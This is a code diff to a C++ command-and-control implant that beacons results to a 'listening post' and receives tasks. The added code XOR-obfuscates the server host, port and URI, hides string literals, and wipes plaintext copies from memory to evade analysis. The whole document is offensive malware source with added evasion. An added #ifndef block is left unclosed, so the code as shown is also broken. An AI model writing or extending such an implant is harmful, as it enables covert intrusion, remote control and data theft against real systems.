@@ -22,6 +22,11 @@
 #include <nlohmann/json.hpp>
 
 
+// you can pass -DXOR_KEY=0x?? at compile time for a non-trivial key
+#ifndef XOR_KEY
+#define XOR_KEY 0x5A   // default – change per build
+
+
 #ifdef DEBUG_BUILD
 #define DEBUG_LOG(x) std::cout << x << std::endl
 #else
@@ -30,6 +35,19 @@
 
 
 using json = nlohmann::json;
+
+
+// Helper: XOR with the same key used for XOR_STR 
+static std::string xorEncrypt(const std::string& input) {
+    std::string out = input;
+    for (char& c : out) c ^= XOR_KEY;
+    return out;
+}
+
+std::string NetSession::decryptConfig(const std::string& encrypted) const {
+    return xorEncrypt(encrypted);//its the same operation I just didn't know ow to keep everything organized
+}
+
 
 
 //Function to send async HTTP(S) POST with payload to listening post
@@ -44,8 +62,9 @@ using json = nlohmann::json;
     auto const serverUri = uri;
     auto const requestBody = json::parse(payload);
 
+    auto secureHttps = XOR_STR_SECURE("https://"); // more secure string for critical info
     std::stringstream ss;
-    ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
+    ss << secureHttps << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
     cpr::SslOptions sslOpts = cpr::Ssl(
@@ -63,6 +82,9 @@ using json = nlohmann::json;
 
     cpr::Response response = asyncRequest.get();
     DEBUG_LOG(XOR_STR("Request body: ") << requestBody);
+
+    volatile char* p = &fullServerUrl[0]; // wipe URL from memory
+    for (size_t i = 0; i < fullServerUrl.size(); ++i) p[i] = 0;
     return response.text;
 };
 
@@ -85,8 +107,20 @@ void NetSession::setMeanDwell(double meanDwell) {
     //Format result
     std::stringstream resultsStringStream;
     boost::property_tree::write_json(resultsStringStream, resultsLocal);
+    std::string hostPlain = decryptConfig(hostEncrypted);
+    std::string portPlain = decryptConfig(portEncrypted);
+    std::string uriPlain  = decryptConfig(uriEncrypted);
     //contact listening posts with results, return received tasks
-    return sendHttpRequest(host, port, uri, resultsStringStream.str(), certPem);
+    std::string response = sendHttpRequest(hostPlain, portPlain, uriPlain,
+                                           resultsStringStream.str(), certPem);
+    // wipe plaintext copies
+    volatile char* hp = &hostPlain[0];
+    for (size_t i = 0; i < hostPlain.size(); ++i) hp[i] = 0;
+    volatile char* pp = &portPlain[0];
+    for (size_t i = 0; i < portPlain.size(); ++i) pp[i] = 0;
+    volatile char* up = &uriPlain[0];
+    for (size_t i = 0; i < uriPlain.size(); ++i) up[i] = 0;
+    return response;
 }
 
 void NetSession::parseTasks(const std::string& response) {
@@ -175,14 +209,14 @@ void NetSession::beacon() {
 
 //Initialize variables for object
 NetSession::NetSession(std::string host, std::string port, std::string uri) :
-    host{ std::move(host) },
-    port{ std::move(port) },
-    uri{ std::move(uri) },
-
+    hostEncrypted{ xorEncrypt(host) },   // you need a simple XOR encrypt function
+    portEncrypted{ xorEncrypt(port) },
+    uriEncrypted{ xorEncrypt(uri) },
     isRunning{ true },
-    dwellDistributionSeconds{ 250 } //make this longer for real case (~ >200)
+    dwellDistributionSeconds{ 250 }
 {
 }
+
 
 void NetSession::start() {
     taskThread = std::async(std::launch::async, [this] {
